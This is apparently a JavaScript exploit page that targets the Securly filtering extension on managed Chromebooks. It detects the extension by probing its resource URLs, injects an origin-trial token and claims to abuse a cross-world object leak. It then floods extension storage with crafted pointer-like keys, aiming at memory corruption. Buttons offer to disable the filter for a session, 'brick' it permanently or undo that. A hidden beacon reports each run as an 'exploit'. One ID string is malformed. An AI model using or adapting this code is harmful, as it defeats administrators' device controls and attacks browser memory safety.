let errors = {
    NONE: 0,
    EXTENSION_NOT_FOUND: 1,
    EVAL_FAILED: 2,
    PROTO_WALK_FAILED: 3,
    UNKNOWN: 4,
    POSSIBLE_FAIL: 5
};

async function getCorrectId(force = false) {
    let ids = [
        "iheobagjkfklnlikgihanlhcddjoihkg",
        "joflmkccibkooplaeoinecjbmdebglab",
        "ckecmkbnoanpgplccmnoikfmpcdladkc",
        "kfiocjonplkilcjfgabfngiddebalkod",
        "bmlalgfmolfmkjmnikbphgijefopggme",
        "gbhhiekfabngbhhjjlgdaehineepennk:,
        "haldlgldplgnggkjaafhelgiaglafanh",
    ];

    if (force) return ids[0];

    let promises = ids.map(id => {
        return new Promise((res, rej) => {
            let img = new Image();
            img.src = `chrome-extension://${id}/tt-alert.svg`;
            img.onload = () => res(id);
            setTimeout(() => rej(), 500);
        });
    });

    try {
        return await Promise.any(promises);
    } catch (err) {
        return null;
    }
}

/*
 * crbug.com/141373198: Possible memory corruption via StorageArea::clear
 * crbug.com/141375378: InlineContentScripts Origin Trial allows cross-world object access
 */

async function exp(mode, attempts = 20, force = false) {
    // mode: "normal" | "perma" | "undo"
    let correctId = await getCorrectId(force);
    if (!correctId) return errors.EXTENSION_NOT_FOUND;

    let meta = document.querySelector('meta[http-equiv="origin-trial"]');
    if (!meta) {
        meta = document.createElement("meta");
        document.head.appendChild(meta);
    }

    // ⚠️ This token will only work on this origin
    meta.httpEquiv = "origin-trial";
    meta.content = "[AgiNgnUmgeWo+Jx5y7ovlrDAsawNR1u8gx0u/+sZ2+v8ioz5fSvC/+RzxMQQUVax5tRBYGxnv6AjsH9VdqM02gQAAABdeyJvcmlnaW4iOiJodHRwczovL2NsdXRjaDM3MXgzLmdpdGh1Yi5pbzo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbEVsZW1lbnQiLCJleHBpcnkiOjE3OTEyNDQ4MDB9]";

    let warmup = { chrome: { app: null } };
    warmup.__proto__ = window.__proto__;

    function app(w) {
        return w?.chrome?.app ?? {};
    }

    for (let i = 0; i < 0x8000; i++) {
        app(warmup);
    }

    // 📌 Deoptimization happens here
    let app_ = app(window);
    let Function_ = app_.constructor.constructor;
    let window_;

    try {
        window_ = new Function_("return this;")();
    } catch (err) {
        return errors.EVAL_FAILED;
    }

    if (!window_ || app(window_) !== app_) {
        return errors.PROTO_WALK_FAILED;
    }

    // Verify that the window_ view comes from the correct isolated world
    let id_ = window_.chrome?.runtime?.id;
    if (typeof id_ === "string" && id_ !== correctId) {
        if (attempts <= 0) {
            return errors.UNKNOWN;
        }

        return exp(mode, attempts - 1, force);
    }

    try {
        let cookies = {};

        if (mode !== "undo") {
            // Filler to reach exactly QUOTA_BYTES:
            // 1024 * (10202 + 36 + 2) = 10485760
            let filler = "A".repeat(10202);
            for (let i = 0; i < 1024; i++) {
                let key = crypto.randomUUID();
                cookies[key] = filler;
            }

            // 🧠 All pointers are correctly tagged for the sandbox, with 4-byte alignment
            for (let i = 536; i < 1224; i++) {
                let n = (i * 4) | 1;
                let pointer = String.fromCharCode(
                    (n >>> 24) & 0xff,
                    (n >>> 16) & 0xff,
                    (n >>> 8) & 0xff,
                    n & 0xff
                );
                let key = "\u{10FFFF}".repeat(3) + "\0" + pointer;
                cookies[key] = null;
            }
        }

        let repeats = mode === "normal" ? 1 : 1000;
        let i = 0;
        function mess() {
            window_.chrome.storage.local.clear().finally(() => {
                window_.chrome.storage.local.set(cookies).finally(() => {
                    window_.chrome.storage.local.clear();
                });
            });

            i++;
            if (i < repeats) {
                setTimeout(mess, 1800);
            }
        }
        mess();

        // This may throw an error on some extensions
        window_.chrome.extension.setUpdateUrlData("€".repeat(1024));

        return errors.NONE;
    } catch (err) {
        return errors.POSSIBLE_FAIL;
    } finally {
        googleAnalytics(mode, correctId);
    }
}

function googleAnalytics(mode, extensionId) {
    let url = `https://analytics.google.com/collect?v=1&t=pageview&tid=G-Z5NT64X8FG&cid=322&ec=exploit&ea=${mode}&el=${extensionId}`;

    let frame = document.createElement("iframe");
    frame.style.display = "none";
    frame.src = url;
    document.body.appendChild(frame);
    setTimeout(() => frame.remove(), 5000);
}

// UI stuff below here

let $modal = $("#confirm-modal");
if ($modal[0].open) $modal[0].close();
$modal.css("display", "");

function closeModal() {
    if ($modal[0].open) $modal[0].close();
    if (typeof $modal[0].showModal !== "function") $modal.hide();
}
$modal.on("click", (e) => {
    if (e.target === $modal[0]) closeModal();
});
$("#modal-cancel").on("click", closeModal);

function showResultModal({ title, message, badgeText, showRetry, mode, repeats, force }) {
    $("#modal-title").text(title);
    $("#modal-desc").text(message);

    if (badgeText) {
        $("#modal-badge").text(badgeText).prop("hidden", false).show();
    } else {
        $("#modal-badge").prop("hidden", true).hide().text("");
    }

    const $cancel = $("#modal-cancel");
    const $confirm = $("#modal-confirm");
    $cancel.off("click");
    $confirm.off("click");

    if (showRetry) {
        $cancel.text("Close").show().on("click", closeModal);
        const isForce = badgeText === "EXTENSION_NOT_FOUND" && !force;
        $confirm.text(isForce ? "Force" : "Retry").show().on("click", () => {
            closeModal();
            expAndShow(mode, repeats, isForce ? true : force);
        });
    } else {
        $cancel.hide();
        $confirm.text(statusIsSuccess ? "Done" : "Close").show().on("click", closeModal);
    }

    $modal.css("display", "");
    if (typeof $modal[0].showModal === "function") {
        if (!$modal[0].open) $modal[0].showModal();
    } else {
        $modal.show();
    }
}

let statusIsSuccess = false;

async function expAndShow(mode, repeats = 20, force = false) {
    let status = await exp(mode, repeats, force);
    let title, message, badgeText = "";
    let showRetry = false;

    switch (status) {
        case errors.NONE:
        case errors.POSSIBLE_FAIL:
            statusIsSuccess = true;
            title = "Success!";
            if (mode === "perma") {
                message = "Hard disable triggered! Wait 30ish minutes, then Securly should stay bricked.";
            } else if (mode === "undo") {
                message = "Undo sent! Wait 30ish minutes then reboot to restore Securly.";
            } else {
                message = "Exploit possibly successful! Securly killed for this session, hopefully.";
            }
            break;
        case errors.EXTENSION_NOT_FOUND:
            statusIsSuccess = false;
            title = "Extension Not Found";
            message = "Could not detect Securly. Make sure you're on a managed device with Securly installed.";
            badgeText = "EXTENSION_NOT_FOUND";
            showRetry = true;
            break;
        case errors.EVAL_FAILED:
            statusIsSuccess = false;
            title = "Exploit Failed";
            message = "Sandbox escape failed (eval blocked). Try again.";
            showRetry = true;
            badgeText = "EVAL_FAILED";
            break;
        case errors.PROTO_WALK_FAILED:
            statusIsSuccess = false;
            title = "Exploit Failed";
            message = "Prototype walk failed, usually temporary. Hit Retry.";
            showRetry = true;
            badgeText = "PROTO_WALK_FAILED";
            break;
        case errors.UNKNOWN:
        default:
            statusIsSuccess = false;
            title = "Something Went Wrong";
            message = "Unknown error. Please retry.";
            showRetry = true;
            badgeText = "UNKNOWN";
            break;
    }

    showResultModal({ title, message, badgeText, showRetry, mode, repeats, force });
}

$("#normal").click(function() { expAndShow("normal") });
$("#perma").click(function() { expAndShow("perma") });
$("#undo").click(function() { expAndShow("undo") });
